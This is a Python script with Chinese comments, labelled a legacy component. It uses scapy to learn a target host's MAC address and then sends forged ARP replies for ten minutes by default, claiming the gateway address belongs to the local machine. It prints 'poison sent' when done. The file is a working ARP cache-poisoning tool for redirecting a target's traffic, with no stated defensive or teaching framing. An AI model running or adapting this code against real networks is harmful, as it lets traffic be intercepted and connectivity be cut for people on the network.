# ============================================================================
# 旧版组件 —— 已被 ../../rawtcp_gw.py 取代，保留只为对上既有文档的引用。
# 注意：getroot.py 走「给本机加 <网关IP>/32 别名」的老路，单网卡拓扑下会断网。
# ============================================================================

from scapy.all import *
import re
import sys, time, threading, os, subprocess

conf.use_pcap = True
IFACE = os.environ.get('IFACE', 'WLAN')

def _mymac():
    """取本机网卡 MAC。不能只用 netsh wlan —— 以太网读不到。"""
    # 1) 让 scapy 直接问这块网卡
    try:
        from scapy.all import get_if_hwaddr
        m = get_if_hwaddr(IFACE)
        if m and m != '00:00:00:00:00:00':
            return m.upper()
    except Exception:
        pass
    # 2) getmac /v 按适配器名匹配（中英文系统列名不同，只认 MAC 形态）
    try:
        out = subprocess.run(['getmac', '/v', '/fo', 'csv', '/nh'],
                             capture_output=True).stdout.decode('gbk', 'replace')
        macre = re.compile(r'^([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}$')
        fallback = None
        for line in out.splitlines():
            parts = [p.strip().strip('"') for p in line.split(',')]
            if not parts:
                continue
            mac = next((p for p in parts if macre.match(p)), None)
            if not mac:
                continue
            if fallback is None:
                fallback = mac
            if parts[0] == IFACE or IFACE in parts[0]:
                return mac.replace('-', ':').upper()
        if fallback:
            return fallback.replace('-', ':').upper()
    except Exception:
        pass
    # 3) 兜底：原来的 wlan 探测
    try:
        out = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
                             capture_output=True).stdout.decode('gbk', 'replace')
        m = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', out, re.I)
        return m.group(1).upper() if m else None
    except Exception:
        return None
MYMAC = os.environ.get('MYMAC') or _mymac()
TGT_IP = os.environ.get('WTA_HOST', '192.168.0.152')
SPOOF = os.environ.get('SPOOF', '192.168.0.1')
dur = int(sys.argv[1]) if len(sys.argv) > 1 else 600

def sniff_mac(timeout=12):
    """学目标真实 MAC：优先嗅它的 ARP/IP 帧，其次纠正内核 ARP 表。"""
    mac = [None]
    def h(p):
        if Ether in p and p[Ether].src.upper() != MYMAC.upper() and mac[0] is None:
            if (ARP in p and p[ARP].psrc == TGT_IP) or (IP in p and p[IP].src == TGT_IP):
                mac[0] = p[Ether].src
    sniff(iface=IFACE, timeout=timeout, prn=h, store=False,
          filter='arp or (ip and host %s)' % TGT_IP, stop_filter=lambda p: mac[0] is not None)
    if not mac[0]:
        out = subprocess.run(['arp', '-a'], capture_output=True).stdout.decode('gbk', 'replace')
        for l in out.splitlines():
            if TGT_IP in l:
                mac[0] = l.split()[1]
    return mac[0]

TGT_MAC = sniff_mac()
print('target', TGT_IP, 'mac', TGT_MAC)
if not TGT_MAC:
    sys.exit('no target mac')

pkt = Ether(dst=TGT_MAC, src=MYMAC) / ARP(op=2, hwsrc=MYMAC, psrc=SPOOF, hwdst=TGT_MAC, pdst=TGT_IP)
end = time.time() + dur
n = 0
while time.time() < end:
    sendp(pkt, iface=IFACE, verbose=False)
    n += 1
    time.sleep(1.2)
print('poison sent', n)
